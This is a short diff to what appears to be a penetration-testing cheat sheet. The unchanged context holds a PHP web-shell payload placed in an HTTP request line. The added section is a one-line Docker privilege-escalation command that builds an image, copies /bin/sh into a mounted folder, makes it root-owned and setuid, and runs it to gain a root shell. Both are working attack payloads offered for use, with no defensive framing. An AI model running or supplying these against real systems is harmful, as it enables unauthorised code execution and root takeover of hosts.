@@ -269,3 +269,8 @@ GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
 Host: $target
 Connection: close
 ```
+
+### [docker privilege escalation]
+```
+echo -e "FROM ubuntu:14.04\nENV WORKDIR /stuff\nRUN mkdir -p /stuff\nVOLUME [ /stuff ]\nWORKDIR /stuff" > Dockerfile && docker build -t my-docker-image . && docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh' && ./sh -c id && ./sh
+```
